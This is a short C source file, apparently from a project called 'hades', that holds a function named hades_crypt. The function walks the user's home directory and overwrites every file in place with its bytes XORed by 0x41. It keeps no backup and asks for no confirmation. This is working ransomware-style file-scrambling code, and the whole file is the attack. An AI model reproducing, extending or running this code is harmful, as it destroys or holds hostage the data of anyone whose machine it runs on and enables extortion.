
#include "../hades.h"

void
xor(char *content, int count)
{
    for (int k = 0; k < count; k++) {
        content[k] ^= 0x41;
    }
}

void
xorfile(char *filename)
{
    int fd;
    FILE *fptr;
    struct stat filestat;

    fptr = fopen(filename, "r+");
    if (fptr == NULL) return;

    fd = fileno(fptr);

    fstat(fd, &filestat);

    if (filestat.st_size == 0) return;

    char *buffer = (char *)malloc(filestat.st_size);

    read(fd, buffer, filestat.st_size);

    xor(buffer, filestat.st_size);

    fseek(fptr, 0, SEEK_SET);

    write(fd, buffer, filestat.st_size);

    fclose(fptr);

    free(buffer);
    buffer = NULL;
}

void
hades_crypt(void)
{
    char *cwd = getcwd(NULL, MAX_PATHSIZE);
    chdir(getenv("HOME"));

    char **files = hades_directory_files(getenv("HOME"));

    int index = 0;
    char *file;
    while ((file = files[index]) != NULL) {
        xorfile(file);
        index++;
    }

    chdir(cwd);
}